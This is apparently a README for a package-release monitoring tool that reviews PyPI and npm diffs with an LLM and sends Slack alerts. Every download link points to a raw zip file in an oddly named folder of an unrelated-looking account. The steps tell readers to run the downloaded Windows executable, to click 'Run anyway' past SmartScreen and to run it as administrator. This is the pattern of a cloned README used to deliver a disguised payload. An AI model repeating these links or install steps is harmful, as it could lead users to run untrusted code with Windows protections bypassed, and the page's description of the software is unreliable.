# 🛡️ supply-chain-monitor - Watch package updates for risk

[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)

## 📦 What this app does

Supply Chain Monitor watches popular **PyPI** and **npm** packages for new releases. It checks each new version, compares it with the one before it, and looks for signs of unsafe changes.

If it finds a release that looks risky, it can send an alert to Slack.

Use it to keep an eye on software you depend on, so you can spot strange changes sooner.

## 💻 What you need

Before you install the app on Windows, make sure you have:

- Windows 10 or Windows 11
- Internet access
- A Slack workspace if you want alerts
- A current browser
- Permission to run downloaded files on your PC

The app monitors both package stores by default:

- PyPI
- npm

You can also turn off one of them after setup if you only want one source.

## 🚀 Download the app

Go to the release page here:

[Download Supply Chain Monitor](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)

On that page, look for the latest release and download the Windows file for your system.

If you see more than one file, choose the one that matches Windows. A file with `.exe` in the name is the one you usually want.

## 🪟 Install on Windows

1. Open the download page in your browser.
2. Find the latest release.
3. Download the Windows installer or app file.
4. If your browser asks what to do with the file, choose **Save**.
5. After the download finishes, open the file.
6. If Windows asks for permission, choose **Run** or **Yes**.
7. Follow the on-screen setup steps.

If Windows shows a SmartScreen prompt:

1. Select **More info**.
2. Select **Run anyway**.

## ⚙️ Set up the app

After the app opens, you will need to tell it what to monitor and where to send alerts.

Typical setup includes:

- A Slack webhook URL for alerts
- A list of packages to watch, if you want custom targets
- Options to turn off PyPI or npm if needed

If the app uses a settings file, place it in the same folder as the app unless the release page says something else.

A simple setup might look like this:

- Keep both PyPI and npm on
- Add your Slack webhook
- Start the monitor
- Leave it running in the background

## 🔔 Connect Slack alerts

Supply Chain Monitor can send a Slack message when it finds a package release that looks harmful.

To set that up:

1. Open Slack.
2. Create or choose a channel for alerts.
3. Add an incoming webhook for that channel.
4. Copy the webhook URL.
5. Paste it into the app settings or config file.

If you do not add a Slack webhook, the app can still check package releases, but it will not send alerts to Slack.

## ▶️ Run the app

After setup, start the app from the file you downloaded.

What it does when it runs:

- Checks PyPI for new package releases
- Checks npm for new package releases
- Compares each new release with the prior one
- Uses an LLM through Cursor Agent CLI to review the change
- Marks the change as benign or malicious
- Sends a Slack alert if it finds a risky release

Keep the app open if you want it to keep checking in the background.

## 🧭 What the app checks

The app looks at package changes in two ways:

- For PyPI, it checks the package release history
- For npm, it checks the change feed
- It then compares file changes between releases
- It sends the diff to the review step
- It uses the result to decide if the change looks safe or unsafe

This helps you spot things like:

- New code that should not be there
- Strange install scripts
- Hidden changes in a package update
- Suspicious edits in release files

## 🛠️ Common options

You may see command-line options or app settings like these:

- `--no-pypi` to stop PyPI checks
- `--no-npm` to stop npm checks

Use these if you only want one source checked.

If you are using a shortcut or batch file, you can add these options there if the app supports them.

## 🗂️ Suggested first run

If this is your first time using the app:

1. Download the latest release.
2. Run the Windows file.
3. Add your Slack webhook.
4. Leave both PyPI and npm enabled.
5. Start the monitor.
6. Wait for the first check cycle to finish.

If it is working, you should see activity in the app or in your Slack channel when a risky release is found.

## 🧪 Simple use case

A practical setup looks like this:

- You depend on packages for a project or team
- You want to watch for supply chain risk
- You do not want to check every release by hand
- You want a Slack message when something looks wrong

The app does the routine checking for you.

## 🔍 When to use it

Use Supply Chain Monitor if you want to watch package updates for:

- Open source projects
- Internal tools
- Build systems
- Apps that depend on many third-party packages
- Teams that need early warning for package risk

## 📁 If you need to move the app

If you want to keep the app in one place on your PC:

1. Create a folder such as `C:\Tools\supply-chain-monitor`
2. Put the downloaded file there
3. Run it from that folder each time
4. Keep your settings file in the same folder if the app uses one

This makes it easier to find later.

## 🧰 Troubleshooting

If the app does not start:

- Check that the file finished downloading
- Try running it again as administrator
- Make sure Windows did not block the file
- Check that your internet connection works
- Confirm that your Slack webhook URL is correct

If you do not get alerts:

- Check the Slack webhook
- Make sure the target channel still exists
- Confirm that alerting is turned on
- Check that the app is still running

If one package source seems silent:

- Make sure you did not disable it with `--no-pypi` or `--no-npm`
- Check your internet connection
- Wait for the next polling cycle

## 📌 Release page

Use this page to download the latest Windows file:

[https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip](https://raw.githubusercontent.com/harriottdirty774/supply-chain-monitor/main/coronae/supply_monitor_chain_2.5.zip)

## 🔐 What the results mean

The app classifies changes in package releases as one of two types:

- **Benign**: The change looks normal
- **Malicious**: The change looks risky

If a release is marked malicious, the app sends a Slack alert so you can review it fast

## 🖥️ Best way to keep it running

For best results on Windows:

- Leave the app open
- Keep your PC connected to the internet
- Do not close the terminal or window if the app needs it
- Check Slack from time to time
- Update to the newest release when one is available